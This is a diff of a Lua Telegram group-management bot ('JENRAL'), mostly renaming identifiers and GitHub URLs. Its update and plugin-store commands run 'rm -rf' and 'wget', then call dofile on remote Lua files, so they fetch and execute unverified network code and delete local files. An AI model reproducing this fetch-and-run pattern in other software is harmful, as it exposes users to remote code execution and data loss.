+DevALI:del(JENRAL..'ALI:Help61'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:Help6', text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده" ,  1, "md")
 return false end
 end
 if text == "م٦" or text == "م6" or text == "اوامر6" or text == "اوامر٦" then
-local Help = DevALI:get(Jenral..'ALI:Help6')
+local Help = DevALI:get(JENRAL..'ALI:Help6')
 local Text = [[
 ⌁︙اوامر الاعضاء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10353,24 +10341,24 @@ local Text = [[
 ]]
 Dev_ALI(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if SecondSudo(msg) then
 if text == "تحديث السورس" or text == "تحديث سورس" then 
-Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙جاري تحديث سورس الجنرال', 1, 'md') 
-os.execute('rm -rf Jenral.lua') 
-os.execute('wget https://raw.githubusercontent.com/JenralTEAM/Jenral/master/Jenral.lua') 
-dofile('Jenral.lua') 
+Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙جاري تحديث سورس جنرال ', 1, 'md') 
+os.execute('rm -rf JENRAL.lua') 
+os.execute('wget https://raw.githubusercontent.com/JENRALTEAM/JENRAL/master/JENRAL.lua') 
+dofile('JENRAL.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم التحديث الى الاصدار الجديد', 1, 'md') 
 end
 if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث ⌁' then  
-dofile('Jenral.lua') 
+dofile('JENRAL.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم تحديث ملفات البوت", 1, "md")
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'الملفات' then
 Files = '\n⌁︙الملفات المفعله في البوت ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
 i = 0
@@ -10386,12 +10374,12 @@ end
 send(msg.chat_id_, msg.id_,Files)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/JenralTEAM/JenralFiles/master/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/JENRALTEAM/JENRALFiles/main/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n⌁︙قائمة ملفات متجر سورس الجنرال\n⌁︙الملفات المتوفره حاليا ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
+local TextS = "\n⌁︙قائمة ملفات متجر سورس جنرال \n⌁︙الملفات المتوفره حاليا ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 local TextE = "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙علامة ↫ (✔) تعني الملف مفعل\n⌁︙علامة ↫ (✖️) تعني الملف معطل\n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
@@ -10418,11 +10406,11 @@ end
 if text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
 local FileGet = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
 local FileName = FileGet[2]..'.lua'
-local GetJson, Res = https.request("https://raw.githubusercontent.com/JenralTEAM/JenralFiles/master/JenralFiles/"..FileName)
+local GetJson, Res = https.request("https://raw.githubusercontent.com/JENRALTEAM/JENRALFiles/master/JENRALFiles/"..FileName)
 if Res == 200 then
 os.execute("rm -fr Files/"..FileName)
 send(msg.chat_id_, msg.id_,"\n⌁︙الملف ↫ *"..FileName.."*\n⌁︙تم تعطيله وحذفه من البوت بنجاح") 
-dofile('Jenral.lua')  
+dofile('JENRAL.lua')  
 else
 send(msg.chat_id_, msg.id_,"⌁︙لا يوجد ملف بهذا الاسم") 
 end
@@ -10430,95 +10418,95 @@ end
 if text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
 local FileGet = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
 local FileName = FileGet[2]..'.lua'
-local GetJson, Res = https.request("https://raw.githubusercontent.com/JenralTEAM/JenralFiles/master/JenralFiles/"..FileName)
+local GetJson, Res = https.request("https://raw.githubusercontent.com/JENRALTEAM/JENRALFiles/master/JENRALFiles/"..FileName)
 if Res == 200 then
 local ChekAuto = io.open("Files/"..FileName,'w+')
 ChekAuto:write(GetJson)
 ChekAuto:close()
 send(msg.chat_id_, msg.id_,"\n⌁︙الملف ↫ *"..FileName.."*\n⌁︙تم تفعيله في البوت بنجاح") 
-dofile('Jenral.lua')  
+dofile('JENRAL.lua')  
 else
 send(msg.chat_id_, msg.id_,"⌁︙لا يوجد ملف بهذا الاسم") 
 end
 return false
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and SecondSudo(msg) then    
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف معلومات الترحيب', 1, 'md')   
-DevALI:del(Jenral..'ALI:Text:BotWelcome')
-DevALI:del(Jenral..'ALI:Photo:BotWelcome')
+DevALI:del(JENRAL..'ALI:Text:BotWelcome')
+DevALI:del(JENRAL..'ALI:Photo:BotWelcome')
 return false
 end 
 if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب') and SecondSudo(msg) then    
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
-DevALI:del(Jenral..'ALI:Lock:BotWelcome')
+DevALI:del(JENRAL..'ALI:Lock:BotWelcome')
 return false
 end 
 if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب') and SecondSudo(msg) then    
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
-DevALI:set(Jenral..'ALI:Lock:BotWelcome',true)
+DevALI:set(JENRAL..'ALI:Lock:BotWelcome',true)
 return false
 end 
 if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '↫ تغير معلومات الترحيب ⌁') and SecondSudo(msg) then    
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي نص الترحيب', 1, 'md') 
-DevALI:del(Jenral..'ALI:Text:BotWelcome')
-DevALI:del(Jenral..'ALI:Photo:BotWelcome')
-DevALI:set(Jenral.."ALI:Set:BotWelcome"..msg.sender_user_id_,"Text") 
+DevALI:del(JENRAL..'ALI:Text:BotWelcome')
+DevALI:del(JENRAL..'ALI:Photo:BotWelcome')
+DevALI:set(JENRAL.."ALI:Set:BotWelcome"..msg.sender_user_id_,"Text") 
 return false
 end 
-if text and DevALI:get(Jenral.."ALI:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
+if text and DevALI:get(JENRAL.."ALI:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
 if text and text:match("^الغاء$") then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, "md") 
-DevALI:del(Jenral.."ALI:Set:BotWelcome"..msg.sender_user_id_)   
+DevALI:del(JENRAL.."ALI:Set:BotWelcome"..msg.sender_user_id_)   
 return false
 end 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص ارسل لي صورة الترحيب\n⌁︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
-DevALI:set(Jenral.."ALI:Text:BotWelcome",text) 
-DevALI:set(Jenral.."ALI:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
+DevALI:set(JENRAL.."ALI:Text:BotWelcome",text) 
+DevALI:set(JENRAL.."ALI:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
 return false 
 end 
-if DevALI:get(Jenral.."ALI:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
+if DevALI:get(JENRAL.."ALI:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
 if text and text:match("^الغاء$") then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
-DevALI:del(Jenral.."ALI:Set:BotWelcome"..msg.sender_user_id_)    
+DevALI:del(JENRAL.."ALI:Set:BotWelcome"..msg.sender_user_id_)    
 return false
 end 
 if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
-DevALI:set(Jenral.."ALI:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
+DevALI:set(JENRAL.."ALI:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص وصورة الترحيب", 1, 'md')   
-DevALI:del(Jenral.."ALI:Set:BotWelcome"..msg.sender_user_id_)   
+DevALI:del(JENRAL.."ALI:Set:BotWelcome"..msg.sender_user_id_)   
 end
 return false
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") then
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة المطور الان ", 1, "md")
-DevALI:setex(Jenral.."ALI:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
+DevALI:setex(JENRAL.."ALI:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
 end end
 if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف كليشة المطور", 1, "md")
-DevALI:del(Jenral.."DevText")
+DevALI:del(JENRAL.."DevText")
 end end
---     Source Jenral     --
-if DevALI:get(Jenral.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
+--     Source JENRAL     --
+if DevALI:get(JENRAL.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, "md") 
-DevALI:del(Jenral.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevALI:del(JENRAL.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 return false  end 
-DevALI:del(Jenral.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevALI:del(JENRAL.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 local texxt = string.match(text, "(.*)") 
-DevALI:set(Jenral..'ALI:ChText',texxt)
+DevALI:set(JENRAL..'ALI:ChText',texxt)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
 end
 if text and text:match("^تغير كليشه الاشتراك$") and SecondSudo(msg) or text and text:match("^تغيير كليشه الاشتراك$") and SecondSudo(msg) then  
-DevALI:setex(Jenral.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
+DevALI:setex(JENRAL.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
 local text = '⌁︙حسنا ارسل كليشة الاشتراك الجديده'  
 Dev_ALI(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
 end
@@ -10526,7 +10514,7 @@ if text == "حذف كليشه الاشتراك الاجباري" or text == "ح�
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevALI:del(Jenral..'ALI:ChText')
+DevALI:del(JENRAL..'ALI:ChText')
 textt = "⌁︙تم حذف كليشة الاشتراك الاجباري"
 Dev_ALI(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
 end end
@@ -10534,12 +10522,12 @@ if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاش�
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-local chtext = DevALI:get(Jenral.."ALI:ChText")
+local chtext = DevALI:get(JENRAL.."ALI:ChText")
 if chtext then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙كليشة الاشتراك ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n['..chtext..']', 1, 'md')
 else
-if DevALI:get(Jenral.."ALI:ChId") then
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(Jenral.."ALI:ChId"))
+if DevALI:get(JENRAL.."ALI:ChId") then
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(JENRAL.."ALI:ChId"))
 local GetInfo = JSON.decode(Check)
 if GetInfo.result.username then
 User = "https://t.me/"..GetInfo.result.username
@@ -10554,11 +10542,11 @@ https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='.
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين قناة الاشتراك الاجباري \n⌁︙ارسل ↫ تعيين قناة الاشتراك للتعيين ', 1, 'md')
 end end end end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ [@GENRALTEAM]', 1, 'md')    
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'معلومات السيرفر' or text == 'السيرفر' then 
 if not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
@@ -10578,16 +10566,16 @@ echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙مدة تشغيل السيرف�
 ]]):read('*a'), 1, 'md')
 end
 end
---     Source Jenral     --
-JenralFiles(msg)
---     Source Jenral     --
+--     Source JENRAL     --
+JENRALFiles(msg)
+--     Source JENRAL     --
 elseif (data.ID == "UpdateMessageEdited") then
 local msg = data
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
-DevALI:incr(Jenral..'ALI:EditMsg'..result.chat_id_..result.sender_user_id_)
+DevALI:incr(JENRAL..'ALI:EditMsg'..result.chat_id_..result.sender_user_id_)
 local text = result.content_.text_ or result.content_.caption_
 local Text = result.content_.text_
-if DevALI:get(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
+if DevALI:get(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 Media = 'الميديا'
 if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
@@ -10623,26 +10611,26 @@ end
 if not VipMem(result) then
 Filters(result, text)
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
-if DevALI:get(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 end end end 
 end,nil)
---     Source Jenral     --
+--     Source JENRAL     --
 elseif (data.ID == "UpdateMessageSendSucceeded") then
 local msg = data.message_
 local text = msg.content_.text_
-local GetMsgPin = DevALI:get(Jenral..'ALI:PinnedMsgs'..msg.chat_id_)
+local GetMsgPin = DevALI:get(JENRAL..'ALI:PinnedMsgs'..msg.chat_id_)
 if GetMsgPin ~= nil then
 if text == GetMsgPin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevALI:del(Jenral..'ALI:PinnedMsgs'..msg.chat_id_);end;end,nil)   
+tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevALI:del(JENRAL..'ALI:PinnedMsgs'..msg.chat_id_);end;end,nil)   
 elseif (msg.content_.sticker_) then 
 if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevALI:del(Jenral..'ALI:PinnedMsgs'..msg.chat_id_) end,nil)   
+tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevALI:del(JENRAL..'ALI:PinnedMsgs'..msg.chat_id_) end,nil)   
 end
 end
 if (msg.content_.animation_) then 
 if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevALI:del(Jenral..'ALI:PinnedMsgs'..msg.chat_id_) end,nil)   
+tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevALI:del(JENRAL..'ALI:PinnedMsgs'..msg.chat_id_) end,nil)   
 end
 end
 if (msg.content_.photo_) then
@@ -10659,40 +10647,40 @@ if msg.content_.photo_.sizes_[3] then
 id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
 if id_photo == GetMsgPin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevALI:del(Jenral..'ALI:PinnedMsgs'..msg.chat_id_) end,nil)   
+tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevALI:del(JENRAL..'ALI:PinnedMsgs'..msg.chat_id_) end,nil)   
 end end end
---     Source Jenral     --
+--     Source JENRAL     --
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
 print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
-local PvList = DevALI:smembers(Jenral..'ALI:Users')  
+local PvList = DevALI:smembers(JENRAL..'ALI:Users')  
 for k,v in pairs(PvList) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
 end 
-local GpList = DevALI:smembers(Jenral..'ALI:Groups') 
+local GpList = DevALI:smembers(JENRAL..'ALI:Groups') 
 for k,v in pairs(GpList) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
-tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=Jenral,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
-DevALI:srem(Jenral..'ALI:Groups',v)  
+tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=JENRAL,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
+DevALI:srem(JENRAL..'ALI:Groups',v)  
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
-DevALI:srem(Jenral..'ALI:Groups',v)  
+DevALI:srem(JENRAL..'ALI:Groups',v)  
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
-DevALI:srem(Jenral..'ALI:Groups',v)  
+DevALI:srem(JENRAL..'ALI:Groups',v)  
 end
 if data and data.code_ and data.code_ == 400 then
-DevALI:srem(Jenral..'ALI:Groups',v)  
+DevALI:srem(JENRAL..'ALI:Groups',v)  
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
-DevALI:sadd(Jenral..'ALI:Groups',v)  
+DevALI:sadd(JENRAL..'ALI:Groups',v)  
 end end,nil) end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 end 
 ------------------------------------------------
 -- This Source Was Developed By (ALI) @QvQvQvQ.--
 --   This Is The Source Channel @GENRALTEAM .   --
---                - Jenral -                 --
+--                - JENRAL -                 --
 --        -- https://t.me/GENRALTEAM --         --
 ------------------------------------------------ 
